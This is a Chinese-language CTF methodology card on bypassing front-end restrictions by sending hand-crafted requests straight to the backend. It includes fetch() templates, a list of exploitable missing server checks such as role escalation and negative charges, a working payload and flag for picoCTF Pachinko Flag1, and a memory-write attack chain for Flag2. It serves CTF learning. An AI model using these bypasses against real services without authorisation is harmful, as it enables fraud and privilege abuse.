# 攻擊心法：前端限制繞過（Client-Side Bypass）

> 類別：Web · 通用心法卡  
> 來源經驗：picoCTF 2025 Pachinko Flag1 & Flag2、WebSockFish 等  
> 目的：下次遇到「UI 擋住你」時，快速定位思路，不要重新發明輪子。

---

## 一句話核心

**前端限制 ≠ 後端限制。前端的話不可信，直接跟後端說。**

---

## 觸發條件（什麼時候該想到這招）

- UI 上某個操作被擋住、變灰、無反應
- 表單有某個欄位被 `disabled`、`hidden`、或值被鎖死
- 某個選項在 dropdown 裡消失了
- 點了按鈕但「什麼都沒發生」
- 題目敘述強調「UI 只允許 X」→ 這幾乎是明示

---

## 決策流程

```
UI 操作被擋
    ↓
打開 DevTools → 找到擋你的 JS 程式碼
    ↓
確認：這個檢查在瀏覽器跑，還是伺服器跑？
    ├─ 瀏覽器 JS → 前端限制 → 可繞過 ✅
    └─ 伺服器回傳錯誤 → 後端限制 → 要另找破口
    ↓
找到 API 端點和請求格式
    ↓
自己送手工請求（主控台 fetch / curl / Burp）
    ↓
觀察伺服器反應 → 調整 payload → 拿 flag
```

---

## 四個「找 API」的快招

| 方法 | 操作 | 適合場景 |
|------|------|----------|
| **Network tab** | F12 → Network → 正常操作一次 → 右鍵請求 → Copy as fetch | 最快，直接拿骨架 |
| **函式 toString()** | 主控台打 `submitXxx.toString()` | 知道函式名時 |
| **搜源碼** | Cmd+F 搜 `fetch` / `/api` / `/check` / `XMLHttpRequest` | 源碼可讀時 |
| **右鍵按鈕** | 右鍵 → 檢查 → 看 `onclick="xxx()"` | 找到函式入口 |

---

## 手工請求範本（貼進主控台改改就能用）

```js
// 基本 POST JSON
fetch('/api/endpoint', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ key: 'value_ui_would_not_let_you_set' })
}).then(r => r.json()).then(console.log)

// 帶自訂 header
fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ /* ... */ })
}).then(r => r.json()).then(console.log)
```

> Cookie / Session 在同域請求下會自動帶，不需要額外設定。

---

## 常見「後端沒檢查」的失誤類型

| 前端擋了什麼 | 後端實際上沒驗證 | 攻擊結果 |
|---|---|---|
| `input1 != input2` | 只驗格式是整數 | 自接 NAND → NOT |
| 分數/金額不能為負 | 只驗是數字 | 負數扣款 → 餘額暴增 |
| 只允許特定選項 | 只驗欄位存在 | 送任意值 |
| 不能修改 `role` | 沒有伺服器端授權 | 提權 |
| 刪除按鈕對某資源隱藏 | 只靠前端過濾 | 直接 DELETE /resource/id |

---

## 心法對照

| 心法 | 在這裡的意思 |
|------|-------------|
| **Trust Boundary** | 前端不是信任邊界，伺服器才是。UI 能做的事，API 不一定會擋。 |
| **Drop a Layer** | UI 層卡住 → 往下一層：直接操作 HTTP 請求。 |
| **Anchor** | 從「我知道怎麼用的東西」出發：fetch、curl、Burp，這些都能發請求。 |
| **Errors are Oracles** | 伺服器回傳的 400/422/500 告訴你後端真正驗了什麼。每個錯誤 = 一條線索。 |
| **Exploit = Chain** | 每個步驟的輸出是下一步的輸入。哪個環節輸出錯，整條鏈就斷。 |

---

## 快速查核表（遇題時掃一遍）

- [ ] UI 擋住的操作，是前端 JS 擋，還是伺服器擋？
- [ ] 後端 API 的完整請求格式是什麼？（端點、method、body 結構）
- [ ] 後端實際驗了哪些欄位？有沒有漏掉某個「顯而易見」的檢查？
- [ ] 我要送的「UI 不允許但後端會接受」的 payload 長怎樣？

---

## 相關題目 / 範例

---

### picoCTF 2025 — Pachinko Flag1（Medium）

**類型**：Web · 前端 JS 限制繞過

**狀況**：`handleNodeClick()` 擋住 `input1 == input2`，後端 `/check` 完全不驗。

**原理**：`NAND(x, x) = NOT(x)`，把同一個輸入節點自接兩腳就能做反相電路。UI 不讓你做，但後端沒管。

**破口**：在主控台用 `fetch()` 直接 POST 自己組的電路 JSON。

**Payload**（貼進題目頁的瀏覽器主控台）：

```js
fetch('/check', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ circuit: [
    { input1: 5, input2: 5, output: 1 },  // NAND(5,5) = NOT(5) → 輸出節點1
    { input1: 6, input2: 6, output: 2 },
    { input1: 7, input2: 7, output: 3 },
    { input1: 8, input2: 8, output: 4 }
  ]})
}).then(r => r.json()).then(console.log)
// → { flag: "academy{p4ch1nk0_f146_0n3_e947b9d7}" }
```

**節點對應**：輸出 1–4 ↔ 輸入 5–8（`output + 4 = input`）

---

### picoCTF 2025 — Pachinko Flag2（Hard）

**類型**：Web + Pwn · Von Neumann 架構記憶體寫入 / 指令注入

**狀況**：同一個 instance，但 flag2 要真正「打穿」那顆軟體 CPU。

#### 核心概念：為什麼能寫入記憶體？

這顆 CPU 採 **Von Neumann 架構**：程式碼和資料共用同一塊記憶體。電路的 `node_id` 乘以 2 就是寫入的記憶體位址，但 `node_id` 是 16-bit，乘以 2 後會溢位——這就是**寫入原語（write primitive）**：

```
write_addr = node_id * 2   (mod 0x10000)
```

#### 記憶體佈局

```
0x0000–0x0FFF  程式區（CPU 指令）
0x1000–0x1FFF  輸出區（電路輸出值）
0x2000–0x2FFF  輸入區（電路輸入值）
0x3000+        電路結構區（gates）
```

#### ISA：16-bit 指令格式

```
bits[3:0]  = opcode（最低 4 bits）
bits[15:4] = 操作數

NAND opcode = 0x0（預設閘操作）
ADD  opcode = 0x2（加法）
```

#### 完整攻擊鏈

```
Mutation Gates（在執行時改後面閘的欄位）
    ↓
Patch Gate（把 0x0044 位址的 NAND 指令 opcode 改成 ADD → 升級寫入能力）
    ↓
ADD Chain（疊加出大數值：0x0FFF × 6 = 0x5FFA 等中間值）
    ↓
Write Gates（用 ADD 把 flag.bin 的指令逐字寫入 0x004C–0x005E）
    ↓
CPU 執行到注入的 LOADI + SETFLAG 指令 → flag = true ✓
```

#### Mutation 技術

Mutation 閘在執行時用寫入原語覆蓋**後面閘的欄位**（input1 / input2 / output），讓原本受限的閘在執行期間變成任意位址寫入器。關鍵：gates 按編號順序執行，所以 mutation gate 必須排在被修改的 gate **之前**。

#### flag.bin 要寫入的指令

```
LOADI r0, magic[0]
LOADI r1, magic[1]
LOADI r2, magic[2]
LOADI r3, magic[3]
SETFLAG         ← 觸發 flag = true，需要正確的魔法值在 r0–r3
```

**flag2**：`academy{p4ch1nk0_flag_7w0_...}`（你自己解出的值）

#### 除錯 SOP（exploit chain 卡住時）

1. 本地複製 CPU JS 程式碼，不用每次打 HTTP request
2. 在每個關鍵步驟後 `console.log` 相關記憶體位址的值
3. 逐步確認：mutation 有沒有生效？patch 寫了正確 opcode？CPU 有走到注入位址？
4. **Errors are Oracles**：`wrong answer` / `flag=false` 不是失敗，是告訴你哪個假設錯了

#### 心法：Exploit = Chain

51 個 gate 像一個自我改造的程式：前半部分改變 CPU 能力（NAND→ADD），後半部分利用這個能力完成任務（寫入 flag.bin）。哪個環節輸出不對，整條鏈就斷——用二分法找斷點。

---

*授權用途：CTF / 授權滲透測試 / 自己的機器。*
